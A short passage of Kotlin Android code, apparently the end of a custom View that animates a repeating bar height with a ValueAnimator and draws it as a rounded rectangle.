            duration = 1000; repeatCount = ValueAnimator.INFINITE; repeatMode = ValueAnimator.REVERSE; startDelay = delay
            addUpdateListener { barHeightPct = it.animatedValue as Float; invalidate() }
            start()
        }
    }
    override fun onDraw(canvas: Canvas) {
        val h = height.toFloat(); val barH = h * barHeightPct; val r = width.toFloat() / 2
        canvas.drawRoundRect(0f, h - barH, width.toFloat(), h, r, r, paint)
    }
}